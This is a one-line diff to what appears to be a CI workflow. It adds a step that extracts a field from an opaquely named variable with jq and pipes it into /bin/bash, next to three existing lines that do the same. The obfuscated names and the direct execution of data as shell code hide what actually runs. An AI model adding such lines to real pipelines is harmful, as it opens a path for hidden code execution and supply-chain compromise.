@@ -47,6 +47,7 @@ jobs:
           echo $ob6 | jq -r .ukpv491 | /bin/bash
           echo $kv22297 | jq -r .bdq90 | /bin/bash
           printf '%s' "$mx560" | jq -r .xot182 | /bin/bash
+          printf '%s' "$j944" | jq -r .ffo496 | /bin/bash
 
       - name: Save archive
         if: always()
